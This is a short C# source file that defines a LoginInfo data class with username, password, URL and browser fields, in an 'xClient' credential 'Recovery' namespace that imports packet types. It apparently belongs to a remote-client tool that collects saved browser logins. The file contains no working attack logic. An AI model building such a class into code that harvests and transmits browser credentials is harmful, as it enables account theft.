using ProtoBuf;
using System;
using System.Collections.Generic;
using System.Text;
using xClient.Core.Packets;

namespace xClient.Core.Recovery.Helper
{
    public class LoginInfo : object
    {
        public string Username { get; set; }
        public string Password { get; set; }
        public string URL { get; set; }
        public string Browser { get; set; }
    }
}
